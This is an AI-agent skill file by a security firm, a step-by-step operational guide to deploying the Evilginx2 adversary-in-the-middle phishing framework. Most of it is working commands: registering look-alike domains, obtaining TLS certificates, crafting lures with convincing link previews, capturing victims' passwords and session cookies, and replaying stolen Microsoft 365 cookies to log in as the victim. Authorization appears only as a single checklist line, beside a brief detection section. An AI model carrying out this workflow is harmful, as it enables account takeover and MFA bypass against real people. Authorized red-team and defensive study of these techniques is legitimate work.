---
name: evilginx2
description: >
  Deploy and operate Evilginx2 — an adversary-in-the-middle phishing framework that captures
  session tokens and cookies to bypass MFA. Use when working with kgretzky/evilginx2, when
  the user needs to set up a phishing page using a built-in or custom phishlet, configure
  DNS and TLS, create and manage lures, capture and extract session cookies from victim logins,
  or build custom phishlets for new targets. Covers installation, phishlet concepts, full
  deployment workflow, session extraction, DNS/TLS configuration, and detection/defense awareness.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/kgretzky/evilginx2
  language: Go
---

# evilginx2 Agent Skill

## When to Use This Skill

Use this skill when:
- Conducting authorized phishing simulations requiring MFA bypass
- The user needs to capture session tokens/cookies to sidestep 2FA
- Setting up a phishing infrastructure with valid TLS certificates
- Creating or adapting phishlets for a specific web application
- The user asks about evilginx2, adversary-in-the-middle phishing, or session hijacking
- Analyzing or testing the detection/defense posture against AiTM attacks
- Red team engagements requiring authenticated access beyond the login page

## What Evilginx2 Does

Evilginx2 is an adversary-in-the-middle (AiTM) phishing framework that acts as a reverse proxy
between the victim and the legitimate website. The victim's browser communicates with evilginx2
using a look-alike domain; evilginx2 relays all traffic to the real site. Because it sits in the
middle of an authenticated session, it captures session cookies AFTER the victim successfully
completes MFA — completely bypassing authenticator apps, SMS codes, and hardware tokens.
The captured cookies are imported into an attacker's browser for instant authenticated access.

## Installation

### Build from source (recommended — get latest phishlets)
```bash
# Prerequisites
sudo apt install -y golang git make

# Clone
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2

# Build
make

# Binary: build/evilginx
sudo cp build/evilginx /usr/local/bin/evilginx2

# Phishlets are in the phishlets/ directory — copy to working dir
mkdir -p /opt/evilginx && cp -r phishlets /opt/evilginx/
```

### Go install
```bash
go install github.com/kgretzky/evilginx2@latest
# Note: phishlets not bundled — clone repo for phishlet files
```

### Pre-built binary (releases page)
```bash
VERSION=3.3.0
curl -sSL https://github.com/kgretzky/evilginx2/releases/download/v${VERSION}/evilginx_linux_64bit.tar.gz \
  | tar -xz
sudo mv evilginx /usr/local/bin/evilginx2
```

### VPS requirements
- Public IP address (for DNS A records)
- Domain name with delegated nameservers (or A/CNAME records)
- Ports 53 (TCP/UDP), 80, 443 open in firewall
- Not shared hosting — must be a dedicated VPS

## Core Concepts

### Phishlets
A phishlet is a YAML configuration file that tells evilginx2 how to proxy a specific target
website. It defines:
- `proxy_hosts` — domain patterns to intercept (the real site's domains)
- `sub_filters` — text/URL substitutions in HTML/JS responses (replace real domain → phish domain)
- `auth_tokens` — which cookies/tokens to capture (name, domain, path, HTTP-only flag)
- `credentials` — which POST body parameters to extract (username, password fields)
- `landing_path` — URL paths that trigger the session capture

### Phishing Domain Setup
```
Attacker's domain: evilcorp-phish.com
Phishlet target: Microsoft 365

DNS setup:
  A     @              → VPS_IP      (optional, for direct access)
  A     *.evilcorp-phish.com → VPS_IP   (wildcard — catches all subdomains)
  NS    ns1            → ns1.evilcorp-phish.com  (if using evilginx2 as nameserver)
  A     ns1            → VPS_IP

Evilginx2 handles its own DNS internally when configured as authoritative nameserver.
Wildcard A record works without delegated NS (simpler, but no built-in DNS server).
```

### TLS Certificates
Evilginx2 automatically obtains Let's Encrypt certificates for the phishing domains it serves.
It uses the ACME protocol (HTTP-01 or DNS-01 challenge) when TLS is enabled. Requires:
- Port 80 open (HTTP-01 challenge)
- Domain DNS pointing to the VPS

## Starting Evilginx2

```bash
# Start with phishlets directory
sudo evilginx2 -p /opt/evilginx/phishlets

# Start with config in non-default path
sudo evilginx2 -p /opt/evilginx/phishlets -c /opt/evilginx/config

# Debug mode (verbose logging — useful during setup)
sudo evilginx2 -p /opt/evilginx/phishlets -debug

# Developer mode (disable SSL cert verification, use self-signed certs)
sudo evilginx2 -p /opt/evilginx/phishlets -developer
# -developer skips Let's Encrypt and uses test certs — safe for local testing

# Running on non-standard ports (e.g., for reverse proxy behind nginx)
sudo evilginx2 -p ./phishlets -http_port 8080 -https_port 8443
```

## Initial Configuration

After first start, configure the phishing domain and server IP from the evilginx2 REPL:

```
# Set the phishing domain (your registered domain)
config domain evilcorp-phish.com

# Set the server's external IP (VPS public IP)
config ipv4 203.0.113.50

# Verify config
config

# Expected output:
# domain    : evilcorp-phish.com
# ipv4      : 203.0.113.50
# https_port: 443
# http_port : 80
```

## Phishlet Management

```bash
# List all available phishlets
phishlets

# Check phishlet for a specific service
phishlets hostname o365        # Set hostname (subdomain prefix) for Microsoft 365 phishlet
# Syntax: phishlets hostname <phishlet_name> <hostname>
phishlets hostname o365 login
# Creates: login.evilcorp-phish.com → proxies login.microsoftonline.com

# Enable a phishlet (triggers Let's Encrypt cert request)
phishlets enable o365

# Disable a phishlet
phishlets disable o365

# List with status
phishlets
# Shows: enabled/disabled, hostname, TLS cert status

# Common built-in phishlets
# o365          — Microsoft 365 / Azure AD
# gmail         — Google / Gmail
# linkedin      — LinkedIn
# github        — GitHub
# facebook      — Facebook
# twitter       — Twitter/X
# outlook       — Outlook.com
# paypal        — PayPal
# dropbox       — Dropbox
# yahoo         — Yahoo Mail
```

## Creating and Managing Lures

Lures are unique per-victim phishing URLs with tracking metadata.

```bash
# Create a lure for a phishlet
lures create o365

# List all lures
lures

# Get the phishing URL for a specific lure (by ID)
lures get-url 0

# Set redirect URL (where victim goes after successful capture)
lures edit 0 redirect_url https://www.microsoft.com/en-us/microsoft-365

# Set a custom path (make URL look more legit)
lures edit 0 path /signin/v2/oauth2/authorize

# Set a OG (Open Graph) metadata for link preview
lures edit 0 og_title "Sign in to Microsoft 365"
lures edit 0 og_description "Your organization requires you to sign in."
lures edit 0 og_image https://www.microsoft.com/favicon.ico

# Delete a lure
lures delete 0

# Lure URL format
# https://login.evilcorp-phish.com/UNIQUE_TOKEN
```

## Session Capture and Token Extraction

```bash
# List captured sessions (live and completed)
sessions

# View details of a specific session by ID
sessions 0

# Session output includes:
# - Session ID
# - Phishlet name
# - Landing URL (which lure was used)
# - Username (if credentials captured)
# - Password (if captured in POST body)
# - Tokens (session cookies — the crown jewel)
# - Remote IP
# - User-Agent (victim's browser fingerprint)
# - Create/update timestamps
# - Session token (captured cookie JSON blob)

# Token output example:
# tokens: [
#   {domain: ".login.microsoftonline.com", name: "ESTSAUTH", ...}
#   {domain: ".login.microsoftonline.com", name: "ESTSAUTHPERSISTENT", ...}
# ]

# Export session tokens (for import into browser extension)
sessions 0
# Copy the JSON token blob

# Delete a session
sessions delete 0
# Delete all
sessions delete all
```

## Importing Captured Cookies into Browser

```bash
# Method 1: Cookie-Editor extension (Chrome/Firefox)
# 1. Install Cookie-Editor browser extension
# 2. Navigate to the legitimate site (e.g., portal.office.com)
# 3. Open Cookie-Editor → Import → paste JSON cookie blob from evilginx2
# 4. Refresh — you are now authenticated as the victim

# Method 2: EditThisCookie or J2TEAM Cookies extension
# Similar workflow — import the JSON blob from sessions output

# Method 3: Python requests (for API access)
python3 <<'EOF'
import requests
cookies = {
    "ESTSAUTH": "VALUE_FROM_EVILGINX2",
    "ESTSAUTHPERSISTENT": "VALUE_FROM_EVILGINX2"
}
r = requests.get("https://outlook.office365.com/api/v2.0/me", cookies=cookies)
print(r.json())
EOF
```

## DNS Configuration

### Option A: Wildcard A record (simplest)
```
# Register domain: evilcorp-phish.com
# In registrar DNS panel:
A     @              → VPS_IP
A     *              → VPS_IP   ← wildcard catches all subdomains

# Evilginx2 does NOT need to be the authoritative NS
# Just needs port 80/443 open
# Let's Encrypt HTTP-01 challenge works fine
```

### Option B: Delegate NS to evilginx2 (evilginx2 as DNS server)
```
# At registrar: set custom nameservers
NS    ns1.evilcorp-phish.com
NS    ns2.evilcorp-phish.com
A     ns1  → VPS_IP
A     ns2  → VPS_IP

# Evilginx2 handles all DNS internally on port 53
# More flexible (supports DNS-01 ACME challenges)
# Requires port 53 TCP/UDP open on VPS
```

## TLS Certificate Handling

```bash
# Evilginx2 automatically requests Let's Encrypt certs when you enable a phishlet
# It handles cert renewal automatically

# Cert storage location
ls ~/.evilginx/certs/

# Common TLS issues:
# 1. Let's Encrypt rate limit: max 5 certs/domain/week
#    Use -developer mode for testing to avoid burning rate limit
# 2. Port 80 blocked: HTTP-01 challenge fails
#    Open port 80 in firewall / ufw
# 3. Wildcard cert: requires DNS-01 challenge
#    Must use evilginx2 as authoritative NS (Option B above)

# Force cert renewal
phishlets disable o365
phishlets enable o365    # Re-enables and re-requests cert

# Check cert validity from REPL
phishlets    # Shows TLS status column
```

## Custom Phishlet Creation

Phishlets are YAML files. Structure:

```yaml
# custom-target.yaml
name: 'customapp'
author: '@attacker'
version: '1.0'
description: 'Custom App Phishlet'
propagate_cookies: true
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'customapp.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'app', orig_sub: 'app', domain: 'customapp.com', session: false}
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'customapp.com', session: false}

sub_filters:
  - {triggers_on: 'login.customapp.com', orig_sub: 'login', domain: 'customapp.com', search: 'customapp.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'app.customapp.com', orig_sub: 'app', domain: 'customapp.com', search: 'customapp.com', replace: '{hostname}', mimes: ['text/html', 'application/json']}

auth_tokens:
  - domain: '.customapp.com'
    keys: ['session_token', 'auth_cookie']
  - domain: 'login.customapp.com'
    keys: ['XSRF-TOKEN']

credentials:
  username:
    key: '(email|username)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(password|passwd|pass)'
    search: '(.*)'
    type: 'post'

login:
  domain: login.customapp.com
  path: '/signin'

landing_path:
  - '/signin'
  - '/auth/callback'
```

### Building a phishlet: methodology
```bash
# 1. Open browser dev tools → Network tab
# 2. Log into the target site, capture all requests
# 3. Identify:
#    - All domains involved (CDN, auth, app)
#    - Session cookies (name, domain, path, HttpOnly)
#    - POST body fields (username, password field names)
#    - The landing/auth-complete URL
# 4. Map orig_sub → proxy_hosts entries
# 5. Write sub_filters for each domain substitution needed
# 6. Set auth_tokens to capture the right cookies
# 7. Set credentials to capture login fields
# 8. Test in -developer mode first (no Let's Encrypt rate limit burn)
```

## Detection and Defense Awareness

### How defenders detect AiTM phishing
- **Impossible travel** — user auth from two geographically distant IPs simultaneously
- **User-agent mismatch** — victim's browser UA vs. token replay UA
- **Conditional access policies** — require compliant device + managed endpoint (token alone insufficient)
- **Microsoft Defender AATP** — detects impossible travel and token replay anomalies
- **FIDO2 / Passkeys** — phishing-resistant authentication; no password/cookie to steal
- **Token binding** — TLS channel binding prevents token replay (not widely deployed)
- **Risky sign-in detection** — Azure AD Identity Protection flags suspicious sign-ins

### Red team operational notes
```
# Operational security checklist:
# - Use a fresh VPS with no prior reputation
# - Register domain 2+ weeks before use (age matters for email deliverability)
# - Never reuse phishing domains across engagements
# - Use residential IP relay if possible (VPN/residential proxy)
# - Clean up: delete sessions and lures after extraction
# - Log all captured credentials and tokens for report evidence
# - Ensure Rules of Engagement explicitly authorize AiTM / credential interception
```

## Troubleshooting

| Problem | Cause | Fix |
|---|---|---|
| TLS cert request fails | Port 80 blocked | Open port 80: `ufw allow 80` |
| DNS not resolving | Wildcard A not propagated | Wait for DNS TTL, verify with `dig *.domain.com` |
| Phishlet shows `disabled` | Not enabled yet | `phishlets enable o365` |
| Rate limit from Let's Encrypt | Too many cert requests | Use `-developer` mode for testing |
| Cookies not captured | Wrong cookie names in phishlet | Inspect real site cookies, update auth_tokens |
| Victim redirected to error | Sub_filter missed a domain | Add missing domain to proxy_hosts + sub_filters |
| Blank page on phish URL | Phishlet hostname not set | `phishlets hostname o365 login` |
| Port 53 permission denied | Non-root can't bind port 53 | Run as root or use `setcap cap_net_bind_service` |

```bash
# Debug DNS resolution from VPS
dig @localhost login.evilcorp-phish.com

# Check evilginx2 logs
# Logs printed to stdout — redirect to file for review
sudo evilginx2 -p ./phishlets -debug 2>&1 | tee evilginx.log

# Verify cert status
curl -vI https://login.evilcorp-phish.com 2>&1 | grep -E "(SSL|TLS|cert|expire)"
```
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [MFA Is Not Enough: How Attackers Bypass Multi-Factor Authentication and What to Do About It](https://redhound.us/mfa-bypass)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
